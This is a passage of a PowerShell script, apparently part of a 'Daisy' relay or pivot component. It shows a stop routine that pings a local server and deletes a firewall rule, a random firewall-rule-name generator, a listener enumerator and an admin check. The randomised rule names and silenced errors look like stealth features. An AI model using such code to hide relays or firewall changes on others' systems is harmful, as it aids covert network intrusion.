        $webClient.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy()
        $webClient.DownloadString("http://localhost:$serverPort/plugins/77/v1.0/stats.php")|Out-Null            
    } catch {}
    try {
        $webClient = New-Object System.Net.WebClient
        $webClient.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy()
        $webClient.DownloadString("http://localhost:$serverPort/plugins/77/v1.0/stats.php")|Out-Null            
    } catch {}
    $error.clear()

    if(Test-Administrator){
        Netsh.exe advfirewall firewall del rule name="$firewallName"
    }
    
}

function StopDaisy {    
    Stop-Daisy
}

function Get-FirewallName 
{
param (
    [int]$Length
)
$set    = 'abcdefghijklmnopqrstuvwxyz0123456789'.ToCharArray()
$result = ''
for ($x = 0; $x -lt $Length; $x++) 
{
    $result += $set | Get-Random
}
return $result
}
Function Invoke-Netstat {                       
try {            
    $TCPProperties = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties()            
    $Connections = $TCPProperties.GetActiveTcpListeners()            
    foreach($Connection in $Connections) {            
        if($Connection.address.AddressFamily -eq "InterNetwork" ) { $IPType = "IPv4" } else { $IPType = "IPv6" }
        $OutputObj = New-Object -TypeName PSobject            
        $OutputObj | Add-Member -MemberType NoteProperty -Name "LocalAddress" -Value $connection.Address            
        $OutputObj | Add-Member -MemberType NoteProperty -Name "ListeningPort" -Value $Connection.Port            
        $OutputObj | Add-Member -MemberType NoteProperty -Name "IPV4Or6" -Value $IPType            
        $OutputObj            
    }            
            
} catch {            
    Write-Error "Failed to get listening connections. $_"            
}
}
function Test-Administrator  
{  
    $user = [Security.Principal.WindowsIdentity]::GetCurrent();
    (New-Object Security.Principal.WindowsPrincipal $user).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)  
}

